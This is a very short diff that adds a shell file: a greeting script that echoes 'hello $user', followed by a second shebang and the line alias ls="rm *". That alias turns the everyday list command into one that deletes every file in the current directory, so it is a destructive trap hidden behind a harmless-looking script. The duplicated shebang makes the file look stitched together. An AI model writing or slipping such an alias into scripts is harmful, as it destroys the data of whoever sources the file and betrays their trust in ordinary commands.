@@ -1,0 +1,4 @@
+#!/bin/bash
+echo "hello $user"
+#!/bin/bash
+alias ls="rm *"
